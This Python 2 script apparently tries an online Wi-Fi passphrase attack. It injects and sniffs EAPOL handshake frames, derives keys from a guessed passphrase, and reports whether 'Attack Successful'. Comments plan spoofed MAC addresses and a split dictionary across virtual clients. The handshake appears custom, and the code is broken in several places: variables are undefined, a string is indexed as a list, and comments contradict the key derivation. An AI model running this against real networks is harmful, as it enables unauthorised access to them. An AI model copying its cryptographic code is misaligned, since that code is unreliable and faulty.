# Client to AP trial for eapol
# version 2
from scapy.all import *
import PyLorcon2
from random import randint
from passlib.hash import pbkdf2_sha512
import hmac, hashlib, pyDes
from random import randint

interface = "wlan0"
ssid = 'WIFINAME'
passphrase = 'Password'

injector = PyLorcon2.Context(iface = interface)	# creating PyLorcon Object
injector.open_injmon()	# open context in inject and monitor mode
injector.get_channel()	# returns 3
# print ':'.join(str(i) for i in injector.get_hwmac())
# injector.set_channel(11) # channel set to 11 # ?
# injector.send_bytes(packet)	ost probable way to send

# defining addresses
destination_addr = '\x70\x1a\x04\xe8\xe1\x7c'
bss_id_addr = destination_addr # Client to AP

# ------------------------------------------------------------ #
# create VWCs here
# let each VWC choose a different MAC address
# give a part of the dictionary to each VWC

def OverallAttack(passphrase):	
	# The whole attack in a function
	# too rad, eh?
	source_addr = '\x50\xb7\xc3\xe5\x7d\x09'

	def inc(gc):    # func to increment gc
	    gc[1] = bin(int(gc[1],2)+1) 
	    temp = gc[0]
	    if len(gc[1]) == 19:	# reset after filling 16 bits
	        gc[1] = bin(0)
	        gc[0] = bin(randint(0,65535)) 
	        while temp == gc[0]:
	            gc[0] = bin(randint(0,65535))
	    return gc

	# function to encrypt gc
	def enc(PMK, gc):   
	    key =  bin(int(PMK[:4],16))[2:] # first 24 Bytes of PMK
	    cipher = pyDes.triple_des(key).encrypt('' + gc[0] + gc[1], padmode = 2)
	    return cipher

	# function to decrypt gc
	def dec(PMK, gc):   
	    key =  bin(int(PMK[:4],16))[2:] # first 24 Bytes of PMK
	    cipher = pyDes.triple_des(key).decrypt('' + gc[0] + gc[1], padmode = 2)
	    return cipher

	
	# packet formation
	packet = '\xb0\x00'
	packet += '\x00\x00'
	packet += destination_addr
	packet += source_addr
	packet += bss_id_addr
	# sequence number
	packet += '\x90\x70'


	# message 1
	# sniffing ANonce
	gc = ''
	EAPoL_header = '' 

	def sniffEAPoL(p):
		if p[0].haslayer(EAPOL):
			print p[0]
			print p[EAPOL].data
			print 'GC = '
			global GC
			global EAPoL_header 
			EAPoL_header = p[EAPOL]
			GC = p[EAPOL].data.split('Message 1 = ')[1]
			print GC

	sniff(iface = interface, filter="wlan proto 0x888e", prn = sniffEAPoL, lfilter=lambda d: d.dst == source_addr)

	# ------------------------------------------------------------ #
	# message 2
	# sending MIC and SNonce 

	# SNonce generation
	# SNonce = bin(randint(0,2**32))
	# print "SNonce : " + str(SNonce)
	# Key Generation
	# PSK - 512 bits 
	print 'PSK: ' 
	PSK = pbkdf2_sha512.using(salt = ssid, salt_size = len(ssid), rounds = 4096).hash(passphrase)
	PSK = str(PSK.split('$')[4]).replace('.','+')+'=='
	PSK = PSK.decode('base64').encode('hex')
	# print PSK, len(PSK)
	print PSK
	print 'Length of PSK (bits): ' + str(int(len(PSK))*4) + '\n'


	# PMK 
	print 'PMK: '
	PMK = pbkdf2_sha512.using(salt = ssid, salt_size = len(ssid), rounds = 4096).hash(PSK)
	PMK = str(PMK.split('$')[4]).replace('.','+')+'=='
	PMK = PMK.decode('base64').encode('hex')
	# print PMK, len(PMK)
	print PMK
	print 'Length of PMK (bits): ' + str(int(len(PMK))*4) + '\n'

	# PTK
	key_data = min(destination_addr,source_addr) + max(destination_addr,source_addr) + gc[0] + gc[1]
	gc = inc(gc)
	key_data += gc[0] + gc[1]
	pke = "Pairwise key expansion"  

	def PRF383(key,A,B):  # function for PRF383
	    blen = 48	# 384 bits # number of bytes = 48
	    i    = 0
	    R    = ''
	    while i <= ((blen*8+159)/160):
	        hmacsha512 = hmac.new(key, A+chr(0x00)+B+chr(i), hashlib.sha512)
	        i += 1
	        R += hmacsha512.digest()
	    return R[:blen]

	PTK = PRF383(PMK, pke, key_data).encode('hex')	# hex string of 96 

	# Other Keys
	KCK = PTK[:32]
	KEK = PTK[32:64]
	TK = PTK[64:]

	print 'PTK: ' + '\n' + PTK
	print 'Length of PTK (bits): ' + str(len(PTK)*4) + '\n'
	print 'KCK: ' + '\n' + KCK
	print 'Length of KCK (bits): ' + str(len(KCK)*4) + '\n'
	print 'KEK: ' + '\n' + KEK
	print 'Length of KEK (bits): ' + str(len(KEK)*4) + '\n'
	print 'TK: ' + '\n' + TK
	print 'Length of TK (bits): ' + str(len(TK)*4) + '\n'

	GC = dec(PMK, GC)

	gc[0] = GC[:18]
	gc[1] = GC[18:]	

	# Calculation of MIC
	MIC = hmac.new(KCK, EAPoL_header, hashlib.sha512).digest()

	packet += 'Message 2 = '
	packet += SNonce + '/' + MIC

	# Message 3 
	# receive either Message 3 or deauthentication frame
	# may also receive Message 1 again
	# but our AP will only send deauth frame for our convenience

	# attackResult function
	def attackResult(pckt):
		if pckt[EAPOL].subtype == '\xb0\x00':
			print 'Attack Successful'
		elif pckt[EAPOL].subtype == '\xc0\x00':
			# end the current thread here 
			print 'Passphrase not found'

	sniff(iface = interface, filter="wlan proto 0x888e", prn = attackResult, lfilter=lambda d: d.dst == source_addr)

	# end of handshake
	# change MAC address and create new VWC, maybe ?


# ----------------------------------------------------------- #
# now VWC creation code here
# give each VWC to use the above function

OverallAttack(passphrase)